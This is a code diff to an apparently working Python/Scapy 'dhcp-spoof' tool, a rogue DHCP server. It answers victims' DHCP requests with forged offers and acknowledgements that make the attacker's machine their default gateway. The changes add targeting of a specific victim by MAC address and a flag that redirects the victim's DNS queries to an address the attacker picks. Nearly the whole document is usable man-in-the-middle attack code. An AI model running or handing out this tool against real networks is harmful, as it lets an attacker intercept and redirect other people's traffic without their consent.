@@ -1,11 +1,13 @@
 #!/usr/bin/python3
 
+import netifaces
 import logging
+import importlib
+import sys
 
 # Suppress Scapy warnings before importing
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-from scapy.all import *
 from sys import argv, exit
 import re
 import socket
@@ -13,10 +15,12 @@ import socket
 # Globals
 my_mac=None
 my_ip=None
+assign_ip=None
+target_mac=''
+dns_server=''
 
 # Constants
 
-ETHER_BROADCAST     = 'ff:ff:ff:ff:ff:ff'
 IP_BROADCAST        = '255.255.255.255'
 DHCP_CLIENT_PORT    = 68 
 DHCP_SERVER_PORT    = 67
@@ -34,6 +38,10 @@ class DHCP_FLAGS:
     HTYPE_LEN_DEF=6
 
 
+def get_my_default_gateway():
+    gws = netifaces.gateways()
+    return gws['default'][netifaces.AF_INET][0]
+
 # Checks if a packet has DHCP layers
 def is_dhcp_layers(pack):
     # Filter by layers
@@ -47,11 +55,15 @@ def is_discover_filter(pack):
         # Check ports
         if pack[UDP].sport == DHCP_CLIENT_PORT and pack[UDP].dport == DHCP_SERVER_PORT:
             # Check if broadcast
-            if pack[Ether].dst == ETHER_BROADCAST and  pack[IP].dst == IP_BROADCAST:
-                 opts = pack[DHCP].options
-                 return opts[0][1] == DHCP_FLAGS.BOOTREQUEST
+            if pack[Ether].dst == 'ff:ff:ff:ff:ff:ff' and  pack[IP].dst == IP_BROADCAST:
+                opts = pack[DHCP].options
+                return opts[0][1] == DHCP_FLAGS.BOOTREQUEST
 
     return False
+
+
+def import_scapy():
+    globals().update(importlib.import_module('scapy.all').__dict__)
 
 
 def is_mac_valid(x):
@@ -68,22 +80,26 @@ def is_ip_valid(x):
     return False
 
 
-def escape(reason):
-    print(reason)
-    sys.exit(1)
-
-
 mac_to_bytes = lambda mac: (eval('0x'+''.join([x for x in mac if x != ':']))).to_bytes(6, byteorder='big')
 
 
 def print_help():
-    print('dhcp-spoof attacker_mac attacker_ip [flags]')
+    print('./dhcp-spoof attacker_mac attacker_ip unused_ip [flags]')
+    print('')
+    print('Arguments')
+    print('\tattacker_mac - MAC address of attacker')
+    print('\tattacker_ip - IP to set as default gateway')
+    print('\tunused_ip - IP to assign for victim')
     print('')
     print('Flags: ')
     print('\t-h,  help')
+    print('')
+    print('\t-t,  target\t- MAC address of specific victim you want to attack')
+    print('')
+    print('\t--dns,\t\t- redirect victim DNS queries to this machine')
 
 
-def build_offer_message(discover, my_mac, my_ip, free_ip):
+def build_offer_message(discover, my_mac, my_ip, free_ip, assign_dns):
     to_mac = discover[Ether].src
 
     # Add Ether
@@ -124,7 +140,7 @@ def build_offer_message(discover, my_mac, my_ip, free_ip):
             ('subnet_mask', '255.255.255.0'),\
             ('broadcast_address', '192.168.1.255'),\
             ('router', my_ip),\
-            ('name_server', my_ip),\
+            ('name_server', assign_dns),\
             ('domain', b'lan'),\
             'end']\
 
@@ -134,7 +150,7 @@ def build_offer_message(discover, my_mac, my_ip, free_ip):
     return frame
 
 
-def build_acknowledge_message(request, my_mac, my_ip, assigned_ip):
+def build_acknowledge_message(request, my_mac, my_ip, assigned_ip, assign_dns):
     to_mac = request[Ether].src
 
     # Add Ether
@@ -187,7 +203,7 @@ def build_acknowledge_message(request, my_mac, my_ip, assigned_ip):
             ('subnet_mask', '255.255.255.0'),\
             ('broadcast_address', '192.168.1.255'),\
             ('router', my_ip),\
-            ('name_server', my_ip),\
+            ('name_server', assign_dns),\
             ('domain', b'lan'),\
             ('client_FQDN', comp_name),\
             'end']
@@ -204,44 +220,72 @@ def gen_request_filter(xid, src_mac):
 
 # Prints an example discovery
 def handle_DHCP_discover(pack):
-    global my_mac, my_ip
+    global my_mac, my_ip, target_mac, dns_server
    
     print('Got Discover from ----> ', end='')
     print(pack[Ether].src)
 
-    if pack[Ether].src == 'd8:f8:83:90:de:d1':
+    do_packet = target_mac == '' or target_mac == pack[Ether].src
+
+    if do_packet:
         print('=-=-=-=- Sending Offer =-=-=-=-')
 
         # TODO: Check for free ip (in different function)
-        assigned_ip = '192.168.1.127'
 
         # Send offer
-        current_offer = build_offer_message(pack, my_mac, my_ip, assigned_ip)
+        current_offer = build_offer_message(pack, my_mac, my_ip, assign_ip, dns_server)
         sendp(current_offer)
 
         # Build filter func
         req_filt = gen_request_filter(pack[BOOTP].xid, pack[Ether].src)
 
         # Sniff for request
-        request = sniff(lfilter=req_filt, count=1, timeout=500)[0]
+        request = sniff(lfilter=req_filt, count=1, timeout=1)[0]
 
         # Send acknowledge
         print('=-=-=-=- Sending Acknowledge =-=-=-=-')
-        ack = build_acknowledge_message(request, my_mac, my_ip, assigned_ip)
+        ack = build_acknowledge_message(request, my_mac, my_ip, assign_ip, dns_server)
         sendp(ack)
+
+        exit(0)
 
 
 def main():
-    global my_mac, my_ip
+    global my_mac, my_ip, assign_ip, target_mac, dns_server
 
-    if len(sys.argv) != 3 or '-h' in sys.argv:
+    if len(sys.argv) < 4 or '-h' in sys.argv:
         print_help()
     else:
         my_mac, my_ip = sys.argv[1], sys.argv[2]
 
-        if not(is_mac_valid(my_mac) and is_ip_valid(my_ip)):
+        assign_ip = sys.argv[3]
+
+        # Check for specific target
+        if '-t' in argv:
+            try:
+                target_mac = argv[argv.index('-t') + 1]
+            except:
+                print('Target not specified')
+                exit(1)
+
+        # Check for DNS manipulation
+        if '--dns' in argv:
+            dns_server = argv[argv.index('--dns') + 1]
+
+            if not is_ip_valid(dns_server):
+                print('Not a valid DNS server')
+                exit(1)
+        else:
+            try:
+                dns_server = get_my_default_gateway()
+            except:
+                dns_server = '8.8.8.8'
+
+        if not(is_mac_valid(my_mac) and is_ip_valid(my_ip) and is_ip_valid(assign_ip)):
             print('Invalid IP or MAC')
             exit(1)
+
+        import_scapy()
 
         print('Listening...')
         sniff(lfilter=is_discover_filter, prn=handle_DHCP_discover)
